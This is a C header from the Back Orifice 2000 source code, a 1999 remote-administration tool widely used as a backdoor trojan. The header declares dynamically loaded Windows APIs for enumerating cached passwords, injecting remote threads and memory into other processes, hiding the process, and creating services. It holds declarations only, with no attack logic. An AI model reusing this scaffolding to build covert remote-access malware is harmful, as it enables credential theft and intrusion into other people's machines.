/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#ifndef __INC_FUNCTIONS_H
#define __INC_FUNCTIONS_H

#include<windows.h>
#include<windef.h>
#include<lmcons.h>
#include<lmshare.h>
#include<tlhelp32.h>

struct PASSWORD_CACHE_ENTRY {
    WORD cbEntry;  
    WORD cbResource;
    WORD cbPassword;
    BYTE iEntry;    
    BYTE nType;     
    char abResource[1];
};

typedef BOOL (FAR PASCAL *CACHECALLBACK)( struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData );

DWORD APIENTRY WNetCachePassword(LPSTR pbResource, WORD  cbResource, LPSTR pbPassword, WORD cbPassword, BYTE nType, UINT fnFlags);
DWORD APIENTRY WNetGetCachedPassword(LPSTR pbResource,WORD cbResource,LPSTR pbPassword, LPWORD pcbPassword, BYTE nType );
DWORD APIENTRY WNetRemoveCachedPassword(LPSTR pbResource, WORD cbResource, BYTE nType);
DWORD APIENTRY WNetEnumCachedPasswords(LPSTR pbPrefix,WORD cbPrefix,BYTE nType,CACHECALLBACK pfnCallback,DWORD dwRefData);

typedef BOOL (WINAPI *MODULEWALK)(HANDLE hSnapshot, LPMODULEENTRY32 lpme); 
typedef BOOL (WINAPI *THREADWALK)(HANDLE hSnapshot, LPTHREADENTRY32 lpte); 
typedef BOOL (WINAPI *PROCESSWALK)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe); 
typedef HANDLE (WINAPI *CREATESNAPSHOT)(DWORD dwFlags, DWORD th32ProcessID); 
typedef DWORD (WINAPI *REGSERVICEPROC)(DWORD dwProcessId, DWORD dwServiceType); 
typedef HANDLE (WINAPI *CREATEREMOTETHREAD)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, DWORD dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef LPVOID (WINAPI *VIRTUALALLOCEX)(HANDLE hProcess, LPVOID lpAddress, DWORD dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI *VIRTUALFREEEX)(HANDLE hProcess, LPVOID lpAddress, DWORD dwSize, DWORD dwFreeType);
typedef BOOL (WINAPI *VIRTUALPROTECTEX)(HANDLE hProcess, LPVOID lpAddress, DWORD dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef DWORD (WINAPI *VIRTUALQUERYEX)(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, DWORD dwLength);

typedef DWORD (WINAPI *ENUMPASSWORD)(LPSTR pbPrefix, WORD  cbPrefix, BYTE  nType, CACHECALLBACK pfnCallback, DWORD dwRefData);
typedef DWORD (WINAPI *WNETCLOSEENUM)(HANDLE henum);
typedef DWORD (WINAPI *WNETENUMRESOURCE)(HANDLE henum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize );
typedef DWORD (WINAPI *WNETOPENENUM)(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCE lpNetResource, LPHANDLE lphEnum );
typedef DWORD (WINAPI *WNETCANCELCONNECTION2)(LPCSTR lpName, DWORD dwFlags, BOOL fForce);
typedef DWORD (WINAPI *WNETADDCONNECTION2)(LPNETRESOURCEA lpNetResource, LPCSTR lpPassword, LPCSTR lpUserName, DWORD dwFlags);

typedef NET_API_STATUS (NET_API_FUNCTION *LMS_NETSESSIONENUM)(IN LPWSTR servername OPTIONAL, IN LPWSTR UncClientName OPTIONAL, IN LPWSTR username OPTIONAL, IN DWORD level, OUT LPBYTE *bufptr,IN DWORD prefmaxlen, OUT LPDWORD entriesread, OUT LPDWORD totalentries, IN OUT LPDWORD resume_handle OPTIONAL);
typedef NET_API_STATUS (NET_API_FUNCTION *LMS_NETSHAREENUM)(IN LPWSTR servername, IN DWORD level, OUT LPBYTE *bufptr, IN DWORD prefmaxlen, OUT LPDWORD entriesread, OUT LPDWORD totalentries, IN OUT LPDWORD resume_handle);
typedef NET_API_STATUS (NET_API_FUNCTION *LMS_NETSHAREDEL)(IN LPWSTR servername, IN LPWSTR netname, IN DWORD reserved);
typedef NET_API_STATUS (NET_API_FUNCTION *LMS_NETSHAREADD)(IN  LPWSTR  servername, IN  DWORD   level, IN  LPBYTE  buf, OUT LPDWORD parm_err);
typedef NET_API_STATUS (NET_API_FUNCTION *LMS_NETAPIBUFFERFREE)(IN LPVOID Buffer);

typedef DWORD (WINAPI *SVR_NETSESSIONENUM)(const char FAR *pszServer, short sLevel, char FAR *pbBuffer, unsigned short cbBuffer, unsigned short FAR * pcEntriesRead, unsigned short FAR * pcTotalAvail);
typedef DWORD (WINAPI *SVR_NETSHAREENUM)(const char FAR *pszServer, short sLevel, char FAR *pbBuffer, unsigned short cbBuffer, unsigned short FAR * pcEntriesRead, unsigned short FAR * pcTotalAvail);
typedef DWORD (WINAPI *SVR_NETSHAREDEL)(const char FAR *pszServer, const char FAR *pszNetName, unsigned short usReserved);
typedef DWORD (WINAPI *SVR_NETSHAREADD)(const char FAR * pszServer, short sLevel, const char FAR * pbBuffer, unsigned short cbBuffer);

typedef LONG (WINAPI *REGSETKEYSECURITY)(HKEY hKey,SECURITY_INFORMATION SecurityInformation, PSECURITY_DESCRIPTOR pSecurityDescriptor);
typedef BOOL (WINAPI *SETSECURITYDESCRIPTORDACL)(PSECURITY_DESCRIPTOR pSecurityDescriptor, BOOL bDaclPresent, PACL pDacl, BOOL bDaclDefaulted);
typedef BOOL (WINAPI *GETACE)(PACL pAcl, DWORD dwAceIndex, LPVOID *pAce);
typedef BOOL (WINAPI *ADDACCESSALLOWEDACE)(PACL pAcl, DWORD dwAceRevision, DWORD AccessMask, PSID pSid);
typedef BOOL (WINAPI *INITIALIZEACL)(PACL pAcl, DWORD nAclLength, DWORD dwAclRevision);
typedef BOOL (WINAPI *INITIALIZESECURITYDESCRIPTOR)(PSECURITY_DESCRIPTOR pSecurityDescriptor, DWORD dwRevision);
typedef DWORD (WINAPI *GETLENGTHSID)(PSID pSid);
typedef BOOL (WINAPI *LOOKUPACCOUNTNAME)(LPCTSTR lpSystemName, LPCTSTR lpAccountName, PSID Sid, LPDWORD cbSid, LPTSTR ReferencedDomainName, LPDWORD cbReferencedDomainName, PSID_NAME_USE peUse);
typedef BOOL (WINAPI *LOOKUPACCOUNTSID)(LPCTSTR lpSystemName, PSID Sid, LPTSTR Name, LPDWORD cbName, LPTSTR ReferencedDomainName, LPDWORD cbReferencedDomainName, PSID_NAME_USE peUse);
typedef BOOL (WINAPI *GETSECURITYDESCRIPTORDACL)(PSECURITY_DESCRIPTOR pSecurityDescriptor, LPBOOL lpbDaclPresent, PACL *pDacl, LPBOOL lpbDaclDefaulted);
typedef BOOL (WINAPI *GETSECURITYDESCRIPTORGROUP)(PSECURITY_DESCRIPTOR pSecurityDescriptor, PSID *pGroup, LPBOOL lpbGroupDefaulted);
typedef BOOL (WINAPI *GETSECURITYDESCRIPTOROWNER)(PSECURITY_DESCRIPTOR pSecurityDescriptor, PSID *pOwner, LPBOOL lpbOwnerDefaulted); 
typedef BOOL (WINAPI *OPENPROCESSTOKEN)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
typedef BOOL (WINAPI *LOOKUPPRIVILEGEVALUE)(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
typedef BOOL (WINAPI *ADJUSTTOKENPRIVILEGES)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
typedef LONG (WINAPI *REGGETKEYSECURITY)(HKEY hKey, SECURITY_INFORMATION SecurityInformation, PSECURITY_DESCRIPTOR pSecurityDescriptor, LPDWORD lpcbSecurityDescriptor);

typedef SC_HANDLE (WINAPI *OPENSCMANAGER)(LPCSTR lpMachineName,LPCSTR lpDatabaseName,DWORD dwDesiredAccess);
typedef SC_HANDLE (WINAPI *CREATESERVICE)(SC_HANDLE hSCManager, LPCSTR lpServiceName, LPCSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR lpDependencies, LPCSTR lpServiceStartName, LPCSTR lpPassword);
typedef BOOL (WINAPI *CLOSESERVICEHANDLE)(SC_HANDLE hSCObject);
typedef SC_HANDLE (WINAPI *OPENSERVICE)(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
typedef BOOL (WINAPI *STARTSERVICECTRLDISPATCHER)(CONST SERVICE_TABLE_ENTRYA *lpServiceStartTable);
typedef SERVICE_STATUS_HANDLE (WINAPI *REGISTERSERVICECTRLHANDLER)(LPCSTR lpServiceName, LPHANDLER_FUNCTION lpHandlerProc);
typedef BOOL (WINAPI *SETSERVICESTATUS)(SERVICE_STATUS_HANDLE hServiceStatus, LPSERVICE_STATUS lpServiceStatus);
typedef BOOL (WINAPI *DELETESERVICE)(SC_HANDLE hService);
typedef BOOL (WINAPI *GETSERVICEDISPLAYNAME)(SC_HANDLE hSCManager, LPCSTR lpServiceName, LPSTR lpDisplayName, LPDWORD lpcchBuffer);
typedef BOOL (WINAPI *STARTSERVICE)(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors);

extern CREATESNAPSHOT pCreateToolhelp32Snapshot; 
extern MODULEWALK  pModule32First; 
extern MODULEWALK  pModule32Next; 
extern PROCESSWALK pProcess32First;
extern PROCESSWALK pProcess32Next;
extern THREADWALK  pThread32First;
extern THREADWALK  pThread32Next;
extern REGSERVICEPROC pRegisterServiceProcess;
extern CREATEREMOTETHREAD pCreateRemoteThread;
extern VIRTUALALLOCEX pVirtualAllocEx;
extern VIRTUALFREEEX pVirtualFreeEx;
extern VIRTUALQUERYEX pVirtualQueryEx;
extern VIRTUALPROTECTEX pVirtualProtectEx;

extern ENUMPASSWORD pWNetEnumCachedPasswords;
extern WNETCLOSEENUM pWNetCloseEnum;
extern WNETENUMRESOURCE pWNetEnumResource;
extern WNETOPENENUM pWNetOpenEnum;
extern WNETCANCELCONNECTION2 pWNetCancelConnection2;
extern WNETADDCONNECTION2 pWNetAddConnection2;

extern LMS_NETSESSIONENUM pLMSNetSessionEnum;
extern LMS_NETSHAREENUM pLMSNetShareEnum;
extern LMS_NETSHAREDEL pLMSNetShareDel;
extern LMS_NETSHAREADD pLMSNetShareAdd;
extern LMS_NETAPIBUFFERFREE pLMSNetApiBufferFree;

extern SVR_NETSESSIONENUM pSVRNetSessionEnum;
extern SVR_NETSHAREENUM pSVRNetShareEnum;
extern SVR_NETSHAREDEL pSVRNetShareDel;
extern SVR_NETSHAREADD pSVRNetShareAdd;

extern REGSETKEYSECURITY pRegSetKeySecurity;
extern SETSECURITYDESCRIPTORDACL pSetSecurityDescriptorDacl;
extern GETACE pGetAce;
extern ADDACCESSALLOWEDACE pAddAccessAllowedAce;
extern INITIALIZEACL pInitializeAcl;
extern INITIALIZESECURITYDESCRIPTOR pInitializeSecurityDescriptor;
extern GETLENGTHSID pGetLengthSid;
extern LOOKUPACCOUNTNAME pLookupAccountName;
extern LOOKUPACCOUNTSID pLookupAccountSid;
extern GETSECURITYDESCRIPTORDACL pGetSecurityDescriptorDacl;
extern GETSECURITYDESCRIPTORGROUP pGetSecurityDescriptorGroup;
extern GETSECURITYDESCRIPTOROWNER pGetSecurityDescriptorOwner;
extern OPENPROCESSTOKEN pOpenProcessToken;
extern LOOKUPPRIVILEGEVALUE pLookupPrivilegeValue;
extern ADJUSTTOKENPRIVILEGES pAdjustTokenPrivileges;
extern REGGETKEYSECURITY pRegGetKeySecurity;

extern OPENSCMANAGER pOpenSCManager;
extern CREATESERVICE pCreateService;
extern CLOSESERVICEHANDLE pCloseServiceHandle;
extern OPENSERVICE pOpenService;
extern STARTSERVICE pStartService;
extern STARTSERVICECTRLDISPATCHER pStartServiceCtrlDispatcher;
extern REGISTERSERVICECTRLHANDLER pRegisterServiceCtrlHandler;
extern SETSERVICESTATUS pSetServiceStatus;
extern DELETESERVICE pDeleteService;
extern GETSERVICEDISPLAYNAME pGetServiceDisplayName;


int InitDynamicLibraries(void);
int KillDynamicLibraries(void);

#endif